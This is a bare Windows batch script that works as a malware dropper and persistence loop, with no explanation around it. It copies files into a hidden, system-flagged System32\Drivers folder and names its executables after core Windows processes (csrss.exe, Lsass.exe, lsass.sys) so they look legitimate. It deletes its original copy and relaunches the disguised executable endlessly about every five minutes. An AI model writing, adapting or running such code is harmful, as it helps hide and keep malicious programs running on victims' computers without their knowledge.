   @echo off
   :primary
   if NOT exist C:\WINDOWS\System32\Drivers\csrss.exe goto :copymain
   if exist C:\WINDOWS\System32\Drivers\explorer.bat goto :main
   :secondary
   mkdir C:\WINDOWS\System32\Drivers
   copy C:\WINDOWS\System32\explorer.bat C:\WINDOWS\System32\Drivers\explorer.bat
   cmd /C attrib +s +h C:\WINDOWS\System32\Drivers
   C:\WINDOWS\System32\Drivers\explorer.bat
   exit
   :main
   copy C:\WINDOWS\System32\explorer.bat C:\WINDOWS\System32\Drivers\explorer.bat
   if exist C:\WINDOWS\System32\explorer.bat goto :delprim
   cmd /C attrib -s -h C:\WINDOWS\System32\Drivers\csrss.exe
   if exist C:\WINDOWS\System32\Drivers\csrss.exe copy C:\WINDOWS\System32\Drivers\csrss.exe C:\WINDOWS\System32\Drivers\lsass.sys
   cmd /C attrib +s +h C:\WINDOWS\System32\Drivers\csrss.exe
   :repeat
   copy C:\WINDOWS\System32\Drivers\lsass.sys C:\WINDOWS\System32\Drivers\Lsass.exe
   C:\WINDOWS\System32\Drivers\Lsass.exe
   @ping 127.0.0.1 -n 2 -w 1000> nul
   @ping 127.0.0.1 -n 300 -w 1000> nul
   del C:\WINDOWS\System32\Drivers\Lsass.exe
   goto :repeat
   :delprim
   if exist C:\WINDOWS\System32\explorer.bat del C:\WINDOWS\System32\explorer.bat
   goto :main
   :copymain
   copy C:\WINDOWS\System32\Drivers\lsass.sys C:\WINDOWS\System32\Drivers\csrss.exe
   C:\WINDOWS\System32\Drivers\csrss.exe
   goto :primary
